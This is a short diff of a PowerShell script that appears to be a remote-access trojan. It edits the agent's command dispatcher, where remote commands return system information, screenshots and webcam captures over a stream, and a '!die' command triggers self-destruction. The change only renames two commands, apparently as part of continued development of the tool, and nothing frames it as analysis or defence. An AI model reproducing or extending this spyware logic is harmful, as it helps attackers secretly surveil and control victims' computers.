@@ -137,7 +137,7 @@ Arch: $env:PROCESSOR_ARCHITECTURE${esc}[0m
                     elseif ($cmd -eq "!sysinfo") {
                         $response = Get-ComputerInfo | Out-String
                     }
-                    elseif ($cmd -eq "!screenshot") {
+                    elseif ($cmd -eq "!sc") {
                         $response = Take-Screenshot
                     }
                     elseif ($cmd -eq "!webcam") {
@@ -152,7 +152,7 @@ Arch: $env:PROCESSOR_ARCHITECTURE${esc}[0m
                     elseif ($cmd -eq "!tree") {
                         $response = Tree-List
                     }
-                    elseif ($cmd -eq "!selfdestruct") {
+                    elseif ($cmd -eq "!die") {
                         $response = "[!] Self-destruct initiated..."
                         $outBytes = [Text.Encoding]::UTF8.GetBytes($response)
                         $stream.Write($outBytes, 0, $outBytes.Length)
